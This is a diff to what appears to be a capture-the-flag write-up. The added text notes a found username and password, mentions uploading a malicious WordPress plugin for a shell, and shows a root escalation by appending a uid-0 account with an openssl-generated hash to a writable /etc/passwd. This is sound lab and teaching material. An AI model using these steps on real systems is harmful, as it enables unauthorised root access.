@@ -24,3 +24,30 @@ Using the word list we found ealier with the username we found the combination:
 ```
 falaraki:Transclisiation
 ```
+
+On the Wordpress site we upload a simple malicious plugin to get shell!
+
+# ROOT
+
+In the `/home` there is a `.secret` that gives the user password
+
+Running `LinEnum.sh` we can see we have `rw` on the `/etc/passwd`!
+
+To create a password hash:
+```
+openssl passwd -1 password1
+```
+
+Giving us:
+
+```
+$1$ht4ERcPM$HSTZjvt10wlym/G8bwHaA/
+```
+
+Adding this to the end of the `passwd` file:
+
+```
+user:\$1\$ht4ERcPM\$HSTZjvt10wlym/G8bwHaA/:0:0:root:/root:/bin/bash
+```
+
+Gives us the ability to login as root!
